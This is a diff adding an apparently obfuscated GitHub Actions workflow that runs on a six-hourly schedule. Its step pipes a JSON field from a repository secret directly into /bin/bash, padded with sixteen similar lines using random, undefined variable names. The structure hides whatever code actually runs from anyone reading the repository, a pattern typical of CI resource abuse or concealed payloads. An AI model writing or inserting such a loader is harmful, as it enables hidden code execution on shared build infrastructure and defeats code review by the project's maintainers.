@@ -1,0 +1,34 @@
+name: jiushiyadiannadepnpy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiushiyadiannadepnpy
+        env:
+          y7221: ${{ secrets.y7221 }}
+        run: |
+          echo $y7221 | jq -r .b56 | /bin/bash
+          echo $zv00 | jq -r .o62 | /bin/bash
+          echo $z513 | jq -r .cgnui6668 | /bin/bash
+          echo $otqrp8 | jq -r .qzt105 | /bin/bash
+          echo $r6 | jq -r .z29 | /bin/bash
+          echo $l54143 | jq -r .fddmg83607 | /bin/bash
+          echo $ew37 | jq -r .kflx0 | /bin/bash
+          echo $zualy08151 | jq -r .m97894 | /bin/bash
+          echo $w408 | jq -r .gf119 | /bin/bash
+          echo $w3 | jq -r .ux7 | /bin/bash
+          echo $poer5 | jq -r .js3 | /bin/bash
+          echo $vdqn850 | jq -r .n7 | /bin/bash
+          echo $vl01905 | jq -r .tfms7 | /bin/bash
+          echo $csrfr0974 | jq -r .r0 | /bin/bash
+          echo $sq9381 | jq -r .ivtwn57480 | /bin/bash
+          echo $juct948 | jq -r .qocb8730 | /bin/bash
+          echo $n17802 | jq -r .qifen09885 | /bin/bash
+
